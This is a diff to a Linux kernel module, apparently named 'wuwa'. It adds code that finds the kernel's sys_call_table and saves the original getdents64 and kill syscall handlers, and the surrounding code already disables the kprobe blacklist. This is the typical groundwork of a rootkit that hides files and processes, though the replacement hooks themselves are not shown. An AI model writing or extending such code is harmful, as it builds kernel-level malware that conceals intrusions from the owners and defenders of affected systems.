@@ -32,6 +32,15 @@ struct linux_dirent {
         char            d_name[1];	/* filename */
 };
 
+// To store the address of the found sys_call_table
+static unsigned long *__sys_call_table;
+
+// Defining a custom function type to store original syscalls
+typedef asmlinkage long (*tt_syscall)(const struct pt_regs *);
+
+static tt_syscall orig_getdents64;
+static tt_syscall orig_kill;
+
 unsigned long *get_syscall_table(void)
 {
 	unsigned long *syscall_table;
@@ -146,6 +155,15 @@ static int __init wuwa_init(void) {
 		isPHook = true;
         wuwa_info("p probe success");
 	}
+
+	__sys_call_table = get_syscall_table();
+	if (!__sys_call_table) {
+		wuwa_err("syscall table find error");
+		return -1;
+	}
+	
+	orig_getdents64 = (tt_syscall)__sys_call_table[__NR_getdents64];
+	wuwa_info("dents found on %lx", orig_getdents64);
 
 #if (LINUX_VERSION_CODE >= KERNEL_VERSION(6, 1, 0))
     ret = disable_kprobe_blacklist();
